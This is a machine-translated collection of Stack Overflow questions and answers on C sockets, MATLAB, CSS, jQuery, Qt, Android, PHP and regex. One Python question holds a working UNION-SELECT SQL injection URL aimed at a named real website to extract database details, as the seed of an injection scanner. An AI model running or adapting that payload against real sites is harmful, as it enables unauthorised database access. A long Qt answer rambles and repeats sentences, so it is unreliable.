  int sockfd , newsockfd , port_no , cli_length , n; 
  char buffer[256];
  struct sockaddr_in server_addr , client_addr;
  FILE *fp;

  int thread_Created = 0;
  pthread_t thread;

  if(argc < 2) {
    fprintf(stderr , "ERROR , no port provided!");
    exit(1);
  }

  sockfd = socket(AF_INET , SOCK_STREAM , 0);

  if( sockfd < 0 )
    error("ERROR opening socket.");

  bzero( (char *) &server_addr , sizeof(server_addr) );
  port_no = atoi(argv[1]);

  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons( port_no );       
  server_addr.sin_addr.s_addr = INADDR_ANY;

  if( bind( sockfd , (struct sockaddr *) &server_addr , sizeof(server_addr)) < 0 ) {
    error("ERROR on binding.");
  }

  listen(sockfd , 5);

  cli_length = sizeof(&client_addr);
  newsockfd = accept( sockfd , (struct sockaddr *) &client_addr , &cli_length );
  if (newsockfd < 0 )
    error("ERROR on accept.");

  bzero(buffer , 256);

  if( (fp = fopen("received.txt" , "w")) != NULL ) {
    while( (n = read(newsockfd , buffer , 255)) != 0 ) {

      int i = 0;
      for(i = 0 ; i < 255 ; i++) {
        if( buffer[i] != '\0')
          fputc(buffer[i] , fp);
      }

      //Create a new thread to read the file and print the results
      if( !thread_Created ) {
        pthread_create( &thread , NULL , printData , NULL );
        thread_Created = 1;
      }

    }
  }

  fclose(fp);

  /* while(pthread_kill(thread , 0 ) == 0 ) { */
  /* } */
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T20:08:48.117

1.  使用互斥锁锁定“活动写入部分”
2.  对文件 IO 使用多路复用。看pool或者epol，选择Linux系统调用

# excel - 将 Excel 打印到 PDF 在新页面上有单元格，而它们在预览中看起来很好

> ID：13076364
> 
> 赞同：0
> 
> 时间：2012-10-25T20:04:42.557
> 
> 标签：excel, pdf, printing

我正在使用 ExportAsFixedFormat 创建多页工作簿的 PDF。在打印预览中，这些看起来很好，并且一切都“打印”得很好。

但是，当我导出为 PDF 时，最右边的列被切断，并出现在第二页上。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T00:16:03.620

下载并安装免费的 Bullzip PDF 打印机。 [http://www.bullzip.com/products/pdf/info.php](http://www.bullzip.com/products/pdf/info.php) 比在 Office 中发布到 PDF 更灵活、质量更高。

# matlab - Matlab的导入功能的范围是什么？

> ID：13076365
> 
> 赞同：2
> 
> 时间：2012-10-25T20:04:48.967
> 
> 标签：matlab, matlab-deployment

我正在尝试将一些用 Matlab 编写的代码变成一个独立的、已编译的 Matlab 应用程序。但是，在遇到一些奇怪的错误之后，我意识到代码大量使用从路径中添加和删除来解决有多个具有相同名称（但结果/计算不同）的函数多次使用的事实。环顾四周，我发现您可以通过在文件夹名称前加上“+”来将文件夹转换为包，然后检查并确保该包中的函数使用`name_of_folder.name_of_function`. 这解决了命名空间问题，但它可能会产生大量工作，因为我现在必须检查并为每个函数调用添加正确的包（我最终可能仍不得不复制大量文件）。

然后我看到了这个`import`功能，我希望这能节省我一些时间。我想我可以将我想要的包传递给一个或两个特定函数，让这些函数导入包，然后事情就会按照我想要的方式工作——如果这些函数调用的函数属于该导入语句的范围。例如，如果我设置类似

```
function foo(var1, var2, ..., packagename)
  eval(sprintf('import %s.*', packagename));
  ...
  bar1(var1, var2);
  ...
  bar2(var2);
  ... 
```

那么我希望`bar1`并将`bar2`使用通过 import 语句导入的包。该文档说条件和函数中的导入语句仅限于该代码块，但我不知道“该代码块”是否仅表示文本，或者“该代码块”是代码和评估的所有内容因此。我有一种感觉是前者，但我想我会问，希望是后者。

那么，导入语句的范围是什么？或者，是否有另一种方法来处理这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T21:38:34.003

对您来说最好的方法可能是承担重命名的痛苦，直到“同名的多个函数”问题消失。这将使您和未来的维护者更容易理解代码。

与您的包装理念不同的两个选项（我喜欢）：

1.  您可以将目录名称附加（或前置）到函数名称，然后将它们全部放入一个新的（名称更好的）目录中。可能更有意义，视情况而定。

2.  如果您`foo`在目录`bar`和中定义了两个函数`car`，并且两个函数都采用相同的参数，则可以将它们统一在一个采用`bar`或`car`作为附加参数的函数中：

    ```
    function foo(parm1, parm2, parm3, version)
    if strcmp(version, 'bar')
        // bar code
    else
        // car code
    end 
    ```

    这不是很好，但它比修改路径要好得多，并且它有点遵循 MATLAB 模式（传入字符串参数以更改函数的详细行为）。即使这两个`foo`函数有不同的参数，您也可以完成这项工作，但是您必须对参数进行烦人的解析，此时您的打包想法对我来说看起来要容易得多。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:19:50.120

我写了一些测试代码来自己尝试一下，确实，import 语句仅限于调用它的函数，这是有道理的，但我想我的希望模糊了我的判断。作为记录，我编写了以下简短函数来测试它：

```
function package_test(package_name)
  eval(sprintf('import %s.*;', package_name));

  test_function();
end 
```

```
function test_function()
  nested_function()
end 
```

然后放

```
function nested_function()
  disp('I\'m in the original folder :(');
end 
```

在与前两个​​函数相同的文件夹中，以及

```
function nested_function()
  disp('I\'m in the package! :)');
end 
```

在一个名为`+trial`. 当然，当我运行时`package_test('trial')`，我看到窗口中显示“I'm in the original folder :(”，同时`trial.nested_function()`给了我希望看到的字符串。

此外，该`eval`函数给编译器带来了问题，用它替换它`import(sprintf('%s.*', package_name));`似乎也无济于事。所以看起来我又开始复制文件了。

# css - iPad 和桌面的媒体查询（最大宽度）

> ID：13076371
> 
> 赞同：10
> 
> 时间：2012-10-25T20:05:14.320
> 
> 标签：css, ipad, media

**我想要一些 CSS 代码以最大宽度：768 为目标 iPad 和桌面。**

这（我不知道为什么，很高兴知道）不适用于 iPad（仅限桌面）：

```
@media only screen and (max-width: 768px) 
```

所以我不得不为 iPad 做这个：

```
@media only screen and (device-width: 768px) 
```

但是，我在两个媒体查询中都有完全相同的代码，我不能接受。

我也试过这个：

```
@media only screen and (max-width: 767px) or (device-width: 768px) 
```

上面的这个也不起作用 - 它实际上适用于桌面，无论宽度如何，而不是在 iPad 上。真的很奇怪。

如何使用相同的媒体查询同时定位 iPad 和桌面？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-10-31T08:31:24.670

您可以使用逗号在 @media 查询中包含两个不同的规则。当规则相同时，这将避免两个设备的冗余 CSS：

```
@media only screen and (device-width: 768px),
       only screen and (max-width: 768px) {
/* CSS */
} 
```

以下代码专门用于 iPad（纵向和横向）：

```
/* iPad Landscape */
@media only screen and (min-device-width: 768px) and (max-device-width: 1024px) {
/* CSS */
}

/* iPad Portrait */
@media only screen and (min-device-width: 768px) and (max-device-width: 1024px) and (orientation: portrait) {
/* CSS */
} 
```

希望这对你有帮助！如果您对此有任何疑问或需要澄清，请告诉我。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-05-07T11:54:03.983

我用过这个。在所有设备上为我工作。

```
@media only screen and (min-width: 1024px) and (max-width: 1199px){

}

@media only screen and (min-width: 768px) and (max-width: 1023px){

}

@media only screen and (min-width: 480px) and (max-width: 767px){

}

@media only screen and (min-width: 0px) and (max-width: 479px){

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-06-28T12:25:15.787

您需要在 HTML 中使用它，然后您的媒体查询将适用于两者。

```
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"> 
```

# jquery - 使用 jQuery 遍历列表

> ID：13076372
> 
> 赞同：0
> 
> 时间：2012-10-25T20:05:17.567
> 
> 标签：jquery, search, autocomplete

我有一个搜索框，它具有我一直在构建的自动完成功能。我有几个问题。

两件事情：

*   在自动完成/搜索词列表中上下箭头时，它包括那些被过滤器隐藏的词。如何确保只能遍历可见的列表项？

*   当我按回车键从列表中选择一项时，下拉菜单仍然存在，因为它与搜索框中的单词匹配。

**[小提琴](http://jsfiddle.net/WUrc8/6/)**

一些代码：

```
$(document).ready(function() {
    $("#dropdown").hide();
    $("input").keyup(function() {
        if (this.value.length) {
            var that = this;
            $("#dropdown li").hide().filter(function() {
                return $(this).html().toLowerCase().indexOf(that.value.toLowerCase()) !== -1;
            }).show();
            $("#dropdown").show();
        }
        else {
            $("#dropdown").hide();
        }
    });

    $('li').click(function() {
        $('#search').val($(this).text());
        $("#dropdown").hide();
    });

    var li = $('li');
    var liSelected;

    $('input').keydown(function(e) {
        if(e.which === 40) {
            if(liSelected) {
                liSelected.removeClass('selected');
                next = liSelected.next();
                if(next.length > 0) {
                    liSelected = next.addClass('selected');
                    $('#search').val(liSelected.text());
                }
                else {
                    liSelected = li.eq(0).addClass('selected');
                }
            }
            else {
                liSelected = li.eq(0).addClass('selected');
            }
        }
        else if(e.which === 38) {
            if(liSelected) {
                liSelected.removeClass('selected');
                next = liSelected.prev();

                if(next.length > 0) {
                    liSelected = next.addClass('selected');
                }
                else {
                    liSelected = li.last().addClass('selected');
                }
            }
            else {
                liSelected = li.last().addClass('selected');
            }
        }
        else if(e.which === 13) {
            $('#search').val(liSelected.text());
            $("#dropdown").hide()
            $('#search').blur();
        }
    });
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T14:41:13.823

关键是您只显示了 .filter() 调用中的元素，但这些元素仍然存在于同一个列表中。您需要创建另一个隐藏的列表，您将在其中放置隐藏的元素。每次用户更新搜索字段时，您必须检查两个列表中的每个元素：需要可见的将进入可见列表，您不想显示的将进入隐藏列表。

这是一个例子

```
$("input").keyup(function(e) {
    if (this.value.length) {
        var that = this;
        $("#dropdown li").each(function() {

            if ( $(this).html().toLowerCase().indexOf(that.value.toLowerCase()) == -1 )
                $(this).appendTo($hidden);
        });
        $('#hidden li').each(function() {
            if ( $(this).html().toLowerCase().indexOf(that.value.toLowerCase()) !== -1 )
                $(this).appendTo('#list');
        });
        $("#dropdown").show();
    }
    else {
        $("#dropdown").hide();
    }
    if ( e.which !== 40 && e.which !== 38 )
    {
        $('#dropdown li,#hidden li').each( function() {
            $(this).removeClass( 'selected' );
        });
        liSelected = null;
    }                                            
}); 
```

您现在每次都有两个列表要检查。现在无法像以前那样缓存 li 的结果，因为它们的数量和位置在不断变化。

[在这里，我更改了您的代码以向您展示我的意思](http://jsfiddle.net/DHwLF/)，可能存在一些错误，但您应该明白这一点。

# python - re.findall() 和 python 3 中的类似 unicode 的错误

> ID：13076374
> 
> 赞同：0
> 
> 时间：2012-10-25T20:05:22.340
> 
> 标签：python, regex, unicode, python-3.x

我在 Windows 8 中使用 python 3.3.0。下面的代码在 python 2.7.x 中成功运行

```
import re, urllib
import urllib.request

arg_end = "--"
url = "http://www.johandemeij.com/post.php?id=276+AND+1=2+UNION+SELECT+1,2,p0w3R,4,p0w3R,p0w3R,7,8,p0w3R,p0w3R--"

url = site.replace("p0w3R","concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)")+arg_end

requrl = urllib.request.Request(url)

response = urllib.request.urlopen(requrl)

source = response.read()

match = re.findall("\x1e\x1e\S+", str(source))

print("match>>>", match) 
```

在这个脚本中，我在匹配变量中没有得到任何值！当我使用这个时：

```
match = re.findall("\x1e\x1e\S+", source) 
```

它给了我这样的错误：

```
TypeError: can't use a string pattern on a bytes-like object 
```

事实上，当我在浏览器中注入 url 时，我在特别易受攻击的列中得到如下结果。 `5.1.61-0+squeeze1johan@localhostjohan_db`

那么，那个 re 有什么问题或者我应该改变什么以及在哪里？当我试图在 python 文档的 re 模块中阅读 \x 时，我什么也没找到！或者可能是，我没有得到它。如果它易于理解，我呼吁您向我推荐一些与此相关的示例。

当我尝试将 1e 转换为字符串时，还有一件事没有给出任何结果！

我刚刚开始学习 python 3，我真的想创建一些有用的脚本，而不是编写简单的程序。所以，我试图在 python 3 中制作简单的 SQLi 扫描器。我从 darkMySQLi 工具中获得了灵感。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T21:38:15.673

默认情况下，普通字符串文字`""`在 Python 2 中是字节字符串，但在 Python 3 中它们是 Unicode 字符串。`b""`在两个版本中都创建一个字节字符串。

[阅读Python 中字节和字符串 (Unicode)](http://docs.python.org/dev/howto/unicode)之间的区别。

您可以使用`urllib.parse.urlencode({'id': '276 AND ...'})`构造 url 查询，将`source`字节解码为 Unicode `source.decode(encoding)`（如何查找字符编码取决于内容类型）。例如，如果`charset`Content-Type http header 中有参数：

```
import cgi

# extract encoding from Content-Type and print the response
_, params = cgi.parse_header(response.headers.get('Content-Type', ''))
print(response.read().decode(params['charset'])) 
```

# android - ImageView getLayoutParams() 返回 null

> ID：13076377
> 
> 赞同：24
> 
> 时间：2012-10-25T20:05:32.207
> 
> 标签：android, android-imageview

我正在用这个简单的方法以编程方式创建一个小部件

```
private ImageView getModuleIconView(Module module) {
    ImageView view = new ImageView(context);
    view.setImageResource(module.getIconResId());        
    view.getLayoutParams().height = 50; //NullPointerException
    return view;
} 
```

我得到 NullPointer 异常，因为 getLayoutParams 返回 null。这是为什么？

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2012-10-25T20:10:30.380

因为您的 imageview 正在播放，所以您没有将其放在屏幕上。所以它没有任何布局参数或任何大小。

如果您想将图像的高度设置为 50，您可以考虑设置此视图的 layoutParams... 您可以将 layoutParams 的高度设置为 50。所以它会满足您的需求。

```
LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(new LayoutParams(LayoutParams.WRAP_CONTENT, 50));
 img.setLayoutParams(lp); 
```

这些行会将您的图像高度设置为 50，但不要忘记我假设您的父视图为线性布局，如果不是，那么您应该使用它的 layoutparams。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-03-17T06:33:53.907

## 科特林答案

其原因（可能）是您刚刚创建它并且尚未在屏幕上呈现它。幸运的是，您可以自己设置

```
val width = LayoutParams.WRAP_CONTENT // or LayoutParams.MATCH_PARENT
val height = (context.)resources.getDimension(R.dimen.my_size)

view.layoutParams = LinearLayout.LayoutParams(width, height) 
```

确保将其`LinearLayout`更改为您要添加的任何布局。

# javascript - 一劳永逸，navigator.onLine 做了什么？

> ID：13076383
> 
> 赞同：13
> 
> 时间：2012-10-25T20:06:02.430
> 
> 标签：javascript, html

我看过一千个帖子，有人问如何在 javascript 中检测互联网连接，总是有人说要使用 navigator.onLine，而另一个人说它不可靠，只告诉你连接是否可用，而不是如果你已经连接了。

底线，navigator.onLine 是否会告诉我，即使 3G/4G 和 WiFi 已打开且未处于飞行模式或其他任何情况下，用户是否由于覆盖范围不佳而无法联系那里的服务器？只是你的平均死区。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-25T20:09:10.840

来自[MDN 文章`navigator.onLine`](https://developer.mozilla.org/en-US/docs/DOM/window.navigator.onLine)：

> 浏览器以不同的方式实现此属性。
> 
> 在 Chrome 和 Safari 中，如果浏览器无法连接到局域网 (LAN) 或路由器，则它处于离线状态；所有其他条件都返回 true。因此，虽然您可以假设浏览器在返回 false 值时处于脱机状态，但您不能假设 true 值必然意味着浏览器可以访问互联网。您可能会得到误报，例如在计算机运行具有始终“连接”的虚拟以太网适配器的虚拟化软件的情况下。因此，如果你真的想确定浏览器的在线状态，你应该开发额外的检查手段。要了解更多信息，请参阅 HTML5 Rocks 文章，[脱离网格工作](http://www.html5rocks.com/en/mobile/workingoffthegrid.html)。
> 
> 在 Firefox 和 Internet Explorer 中，将浏览器切换到离线模式会发送一个 false 值。所有其他条件返回真值

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:08:38.103

根据 MDN，它因浏览器的实现而异。

[https://developer.mozilla.org/en-US/docs/DOM/window.navigator.onLine](https://developer.mozilla.org/en-US/docs/DOM/window.navigator.onLine)

我会假设使用 WebKit 浏览器，它不是知道浏览器可以访问 Internet 的可靠方法，只是某种形式的网络访问。

# regex - 为什么这个正则表达式不起作用？

> ID：13076384
> 
> 赞同：0
> 
> 时间：2012-10-25T20:06:07.040
> 
> 标签：regex

我在用：

```
"<a\b[^>]*href=\"\\lyrics\\*\">(.*?)</a>"; 
```

我正在尝试在这些参数下找到值：

```
 <a href="/lyrics/anything.html">This is what I need</a> 
```

我需要找到“这就是我需要的”，但“任何东西”都会根据链接而变化。我不想在所有“a”标签中找到文本，但只有其中的那些在歌词文件夹中。我不明白为什么这目前不起作用？我很难解释，但提前谢谢。哦，我知道正则表达式可能不是最好的方法，但是，我真的很想研究一下。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T20:08:35.617

您正在逃避`\\`而不是使用`/`(它`/lyrics/`不是`\lyrics\`.

此外，当您应该匹配任何`\\*`不是.`\``"`

以下将做：

```
"<a\b[^>]*href=\"/lyrics/[^\"]*\">(.*?)</a>" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:10:43.093

您的斜线是错误的方式（即构成路径的斜线）并且您在 * 之前缺少一个点：

```
<a\b[^>]*href=\"/lyrics/.*\">(.*?)</a> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T20:15:40.840

取决于您使用的 RegEx 引擎。给定一个 Perl 或 Java 引擎，这就是我看到的错误。

`\b`是不必要的

`\\lyrics\\*`应该是`/lyrics/.*`（如果是 Perl，那么你也需要转义`/`。）

# jquery - 在 jQGrid 底部添加新行

> ID：13076387
> 
> 赞同：2
> 
> 时间：2012-10-25T20:06:16.173
> 
> 标签：jquery, jqgrid

我得到了一个带有内联编辑的 jqgrid，并且可以添加新行。

目前，新行以“编辑”模式显示在网格顶部。我想要的是将新行添加到网格底部，因为我的“添加新行”按钮位于自定义底部分页器中......

有谁知道这是否可能？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-10-26T08:11:18.540

您应该使用通常由[inlineNav](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:inline_editing#inlinenav)`position`选项指定的[addRow](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:inline_editing#addrow)选项：`addParams`

```
$("#grid").jqGrid("inlineNav", "#pager", {addParams: {position: "last"}}); 
```

有关相应的演示，请参见[此处](http://www.ok-soft-gmbh.com/jqGrid/InlineEditingInlineNav1.htm)。

# c++ - 如何在数组QT C++中添加数据

> ID：13076388
> 
> 赞同：2
> 
> 时间：2012-10-25T20:06:21.260
> 
> 标签：c++, arrays, qt, qt-creator, qfile

我想逐行读取一个文本文件并将每一行添加到一个数组中，我尝试了类似的方法，但是我的数组有问题，什么？

```
QFile inputFile("C:\\pepoles.txt");
if (inputFile.open(QIODevice::ReadOnly))
{
    QTextStream in(&inputFile);
    QString pepoles[1000];
    while ( !in.atEnd() )
    {
        QString line = in.readLine();
        pepoles[] = line;
    }
    ui->lineEdit->setText(pepoles[0]);
}
else{
    QMessageBox::critical(this, "Ouups",
                          "Le fichier est introuvable ou vide...");
}

inputFile.close();
} 
```

谢谢 ！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:14:42.597

跟踪您已阅读的行数，并用它来索引人们。此外，请确保您没有超出您的阵列容量。

```
 int lineNum = 0;
   QFile inputFile("C:\\pepoles.txt");
   if (inputFile.open(QIODevice::ReadOnly))
   {
      QTextStream in(&inputFile);
      QString pepoles[1000];
      while ( !in.atEnd() && lineNum < 1000)
      {
         QString line = in.readLine();
         pepoles[lineNum++] = line;
       } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:13:45.293

您需要指定要在哪个位置复制字符串。例如：

```
pepoles[0] = line; 
```

将字符串复制到数组的第一个元素。显然，您将需要一个变量来遍历数组，以便在每个循环中将新字符串复制到数组中的下一个位置。

您可能应该使用 a`QStringList`而不是数组来使事情变得更容易和更安全，这样您就不会意外地写到数组的末尾。例如，您可以定义一个`pepoles`这样的；

```
QStringList pepoles; 
```

然后，每次您想在末尾附加一个新字符串时，您都可以：

```
pepoles << line; 
```

这是`QStringList`有关如何使用它的文档：http: [//doc.qt.digia.com/qt/qstringlist.html#details](http://doc.qt.digia.com/qt/qstringlist.html#details)

您也可以使用 an`std::vector<QString>`代替：

```
std::vector<QString> pepoles; 
```

在这种情况下，您在末尾插入字符串：

```
pepoles.push_back(line); 
```

在`std::vector`这里阅读：[http ://www.cplusplus.com/reference/stl/vector](http://www.cplusplus.com/reference/stl/vector)

`std::vector`不是 Qt 的一部分。它由标准 C++ 库提供。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T20:12:56.227

您应该使用[`QStringList`](http://doc.qt.digia.com/qt/qstringlist.html)而不是`QString [1000];`.

然后你可以简单地添加线

```
peoples << line; 
```

* * *

现在你的语法不正确。您正在尝试分配`line`给数组，还是什么？您只能分配`line`给数组的指定*元素*，例如

```
peoples[i] = line; 
```

但你最好使用第一种方法。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-25T20:17:31.293

这也将只显示第一行：

```
ui->lineEdit->setText(pepoles[0]); 
```

你可能想要这样的东西（如果 pepoles 是一个 QStringList）

```
ui->lineEdit->setText(pepoles.join()); 
```

join() 方法将创建一个连接 qstringlist 中所有项目的 QString

编辑：也许使用 LineEdit 以外的其他东西；）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-05-08T10:25:17.617

这个问题真的取决于很多事情。您从文本文件中提取的信息的计划内容。您是否要将其输出到另一个文本文件，将其显示在具有文本对象功能（即 QTextEdit、QLineEdit 等）的小部件中，将其发送到数据库，将其用于某种类型（即删除重复条目或定界/删除行距）？有问题的文本文件是否换行？每行有多少个字符，因此有多少位。

我这么说，有很多原因。众所周知，Qt 通过 Meta-Object-Compiler 和扩展的宏丰富了 C++ 语言。回到 C++ 编程的基础，宏在编译器实际看到之前重新排列程序文本。我发现在 Qt 中，这比使用文本对象和文件 I/O 发送到文本对象更真实。再一次，这取决于您如何设计您的应用程序。最好遵循 Bjarne 的建议和“决定你想要哪些类，为每个类提供全套操作，通过使用继承明确共性。没有这种共性的地方，数据抽象就足够了。”。

既然我已经说明了这一点，您可能会在编译期间或编译后遇到运行时错误或应用程序意外崩溃/完成。这意味着您必须重写程序/应用程序以计算您的数据流。

如果您想要文本文件中的数据，那么您可以像二进制搜索算法一样搜索/排序文本，以便使用这样的数组进行比较是行不通的。如果要显示文本对象中的所有名称并搜索那些名称，最好创建 QScrollArea 和 QTextEdit，然后将 QTextEdit 添加到 QScrollArea，如下所示：

```
scrollArea = new QScrollArea(this);
textEdit = new QTextEdit("",this);
textEdit -> setGeometry(QRect(QPoint(150, 50), QSize(400,20000)));
scrollArea -> setGeometry(QRect(QPoint(150, 50), QSize(400,300)));
scrollArea -> setWidget(textEdit); 
```

*注意：您可以将 textedits 长度的大小设置为超出窗口大小！12 种字体至少有一千行？？是20000，南北4分包含线边距。

如果在父对象类中创建了滚动区域和 textedit，则读取文件，使用 readAll 而不是 readLine，然后将其显示在 textEdit 中。一千行的行编辑是巨大的！您不必迭代，在这种情况下，您使用 QFile::ReadOnly 描述的内容就足够了。如果您执行父对象的类（即主窗口）中描述的操作，其中行编辑会创建一个读取文件的 void 函数，并将其显示如下：

```
textEdit->setPlainText(line); 
```

然后只需调用 mainWindow 函数底部的函数即可。没有必要创建一个数组来连接所描述的字符串。当您使用我所描述的使用小型三到五行功能时可以更轻松地编辑它们。

如果此应用程序不适合您使用并且您可能希望公开：这可能需要通过函数和数据抽象进行计算，并在数组填充后从/向文本对象输入。在这种情况下，创建容器 QStringList 并在文件关闭后使用如下所示的 qFill 算法。

```
QList<QString> Lstring(lineNumbers); //line numbers is the size of strings per line

qFill(Lstring, peoples.size());

foreach(QString item, Lstring){
    textObjectOfChoice -> setText();
} 
```

我个人更喜欢使用 QStringList，在 MainWindow 的类中创建一个布尔函数，设置为 false（关闭），并在 int main{} 中，一旦应用程序开始执行，当然 MainWindow 或 dialoge 对象已经created 在该对象上调用一个点分隔符，并通过参数传递一个 true 来打开文件加载一次。然后在调用 w.show(); 之后 在递归返回 app.exec() 之前，调用相同的点分隔符函数，然后将值传递给 false。注意：启动画面对此有所帮助。我个人只使用了 50 万字 250 万字符而没有启动画面，它可能会更长，具体取决于您个人在应用程序中编写了多少类。下面是一个将被调用的函数的示例：

```
void WordGame::fileStart(bool load){

    start = load;

    if (start){
        QFile myfile(":/WordGame/WordGame/TheHundredGrand.txt");

        if(myfile.open(QIODevice::ReadOnly | QIODevice::Text))
        {
            QString line;
            QTextStream stream(&myfile);
            int index = 0;
            int length = 0;
            do
            {
                line = stream.readLine();
                arryOne[index] = line;
                listOne << arryOne[index];
                index++;
                length++;
            }while(index<109582);

            stream.flush();
            myfile.close();
        }
    }
} 
```

在 main 中，将调用 WordGame 主窗口类，如下所示： bool load = true; 文字游戏 w; w.fileStart(加载);

```
w.show();

w.fileStart(!load);

return app.exec(); 
```

这当然是您在 qrc 源文件中引用的单词列表。如果您不创建算法的文件加载部分以在调用应用程序的第一个实例后退出，则列表将继续扩展重复自身（请记住，所有具有标准输入/输出的 c/c++ 应用程序本身都是递归的，因此返回应用程序.exec）。将数据抽象到第一个列表创建功能之外的另一个列表（意味着将解析原始列表），以便可以将其与原始列表进行比较，例如已经回答、以前回答、以前搜索过等。基于文本对象数量的最智能移动。最好只创建另一个用户输入列表，然后迭代初始列表与用户输入列表。我会使用这样的东西：

```
QStringList::iterator i3 = qFind(userInputList.begin(), userInputList.end(), word);
QStringList::iterator i2 = qFind(listOne.begin(), listOne.end(), word); 
```

在上述迭代器中，一个查找用户条目是否与初始数据集匹配，另一个则针对用户先前的输入进行搜索。

注意：C++ 或 Java 中的函数和或方法应该是 30 行或更少的数据（非空行）。重复地从具有文本对象功能（即 lineEdit）的小部件中抽象和输入数据，并对它们执行计算，如果您按照所述频繁打开文件，以后可能会出现问题。在对另一个函数的 file.closed() 操作完成后，似乎连接语句应该是有序的。或者使用布尔函数 done = true; 坦率地说，这是在 Qt/Cpp（或任何语言）中开发大型健壮软件的最佳方式是二进制（0 或 1）真或假，功能/方法完成。根据您的使用情况，创建 qrc 文件并将文本文件添加为文件也可能很有趣。创建一次打开和关闭以填充数据容器将是脱离主事件循环的方法。如果您使用 Qstringlist，则该列表可能会不断被填充，直到执行内存转储，然后导致应用程序失败。为了避免这种情况，额外的'list-reset'函数将按顺序进行，例如将“”作为列表的每个索引位置的null进行反向迭代。如果用户点击回车按钮或其他东西，或者您正在开发的任何东西，它会自动调用包含 TextStream 对象的函数吗？就像列表的每个索引位置的“”为空的反向迭代一样。如果用户点击回车按钮或其他东西，或者您正在开发的任何东西，它会自动调用包含 TextStream 对象的函数吗？就像列表的每个索引位置的“”为空的反向迭代一样。如果用户点击回车按钮或其他东西，或者您正在开发的任何东西，它会自动调用包含 TextStream 对象的函数吗？

PS如果你真的想对它说实话，你可以像8位风格那样做它真的很老派，*如果你永远知道你的文本文件会是什么，并且是不可变的；并创建（它是什么？？？）int array[97]，它是所有的字母数字加上大写字母加上特殊字符/标点符号等于数组的一个索引位置。例如一个整数等于一个字符，例如[0]=a，[1]=b，[26]=A，并创建一个字母出现程序来计算/绘制每行每个字符的位置，然后一次你有那个特定的word文件或文本文件的统​​计数据，

# javascript - d3js 过渡阶跃函数

> ID：13076394
> 
> 赞同：4
> 
> 时间：2012-10-25T20:07:06.813
> 
> 标签：javascript, d3.js, transition

我在 d3js 中使用转换，它工作正常。但是，有没有办法在每次更新对象位置时触发函数？（每一步）

这是一些假代码：

```
obj.transition()
  .ease('quad')
  .durantion(250)
  .attr('cy', function(d) {
    return d*d;
   }); 
```

我知道如果你把 each(type, fn) 你可以从 end 和 start 获取事件。但是没有可用的步骤。

```
obj.transition()
  .ease('quad')
  .duration(250)
  .attr('cy', function(d) {
    return d*d;
   })
  .each('start', function(d) { console.log('x'); }); 
```

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T09:35:08.650

从[文档](http://bost.ocks.org/mike/transition/#life-cycle)来看，这听起来像是`tweens`在每一步都进行评估。

> 在过渡运行时，它的补间被重复调用，t 的值从 0 到 1 不等。除了延迟和持续时间之外，过渡还可以轻松控制时间。缓动会扭曲时间，例如慢进和慢出。一些缓动函数可能会暂时给出大于 1 或小于 0 的 t 值；但是，结束时间总是恰好为 1，因此结束值恰好在转换结束时设置。过渡根据其延迟和持续时间之和结束。当过渡结束时，补间最后一次被调用，t = 1，然后调度结束事件。

所以我想你可以尝试添加一个自定义`tween`函数，可能是这样的：

```
obj.transition()
 .tween("customTween", function() {
     console.log("This is the tween factory which is called after start event");
     return function(t) {
        console.log("This is the interpolating tween function");
     };})
  .ease("quad") 
  .durantion(250).attr("cy", function(d){
    return d*d;}); 
```

但是，由于`tweens`旨在用于插值，因此将它们用于其他用途可能是一个坏主意，并且是对 api 的滥用。

您是否考虑过使用多阶段过渡？那将是您添加一个`each("end", function() { nextStep(...) })`并`nextStep`开始一个新的过渡的地方。然后，您可以缩短各个转换的持续时间并在`nextStep`输入时执行您的操作。

# php - 发生致命错误时php重新加载页面

> ID：13076395
> 
> 赞同：1
> 
> 时间：2012-10-25T20:07:09.653
> 
> 标签：php, error-handling

我试图弄清楚发生致命错误时如何刷新页面。基本上我正在访问图像 api 并将图像复制到我的服务器。我还每次都创建照片的缩略图版本。我会每隔一段时间收到一条错误消息，指出我的脚本试图分配过多的内存。在这个网站上好心人的帮助下，我花了无数个小时试图解决这个问题。发生该错误时，我可以自动重新加载页面，这将是完美的。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:08:43.820

我不确定内存不足会让你做任何事情（从未尝试过），但你可以定义自己的错误处理程序也许[http://php.net/manual/en/function.set-error-handler.php](http://php.net/manual/en/function.set-error-handler.php)

编辑：

```
function myErrorHandler($errno, $errstr, $errfile, $errline)
{
  echo "Oh no! Error: $errno, $errstr";
  exit("try sticking a meta redirect here once you get the echo appearing");
}

set_error_handling('myErrorHandler');
// Now write something that runs out of memory, see if handler catches it. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-06T19:16:38.410

